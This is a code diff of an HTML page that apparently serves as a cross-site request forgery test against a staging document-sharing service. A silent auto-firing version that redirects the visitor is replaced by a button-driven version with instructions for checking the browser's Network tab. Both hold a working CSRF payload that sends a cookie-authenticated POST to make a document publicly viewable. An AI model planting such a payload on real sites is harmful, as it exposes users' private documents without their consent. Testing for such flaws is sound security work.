@@ -1,15 +1,39 @@
 <!DOCTYPE html>
-<script>
-// Minimal CSRF attack - no body, no headers
-fetch('https://staging.textjam.com/api/doc/KAM7CN17/access/public/viewer', {
-    method: 'POST',
-    credentials: 'include',  // Send cookies for authentication
-    mode: 'no-cors'         // Bypass CORS completely
-}).catch(() => {}); // Ignore all errors
+<html>
+<body>
+    <h2>CSRF Test - Check Network Tab</h2>
+    <p>Open Developer Tools → Network tab BEFORE clicking</p>
+    
+    <button onclick="sendRequest()">Send CSRF Request</button>
+    
+    <div id="status"></div>
+    
+    <script>
+    function sendRequest() {
+        document.getElementById('status').innerHTML = 
+            '<p style="color: blue;">🔄 Sending request... Check Network tab!</p>';
+        
+        // Send the request
+        fetch('https://staging.textjam.com/api/doc/KAM7CN17/access/public/viewer', {
+            method: 'POST',
+            credentials: 'include',
+            mode: 'no-cors'
+        }).catch(e => {
+            document.getElementById('status').innerHTML += 
+                `<p style="color: orange;">⚠️ Fetch error (expected): ${e.message}</p>`;
+        });
+        
+        document.getElementById('status').innerHTML += 
+            '<p style="color: green;">✅ Request sent! Check Network tab for "public/viewer" request.</p>' +
+            '<p>Look for:</p>' +
+            '<ul>' +
+            '<li>Status code (200, 201, 204, etc.)</li>' +
+            '<li>Request headers (should have cookies)</li>' +
+            '<li>If it shows "CORS error", that\'s fine - request still sent</li>' +
+            '</ul>';
+    }
+    </script>
+</body>
+</html>
 
-// Redirect immediately
-setTimeout(() => {
-    location.href = 'https://staging.textjam.com/doc/KAM7CN17';
-}, 300);
-</script>
 
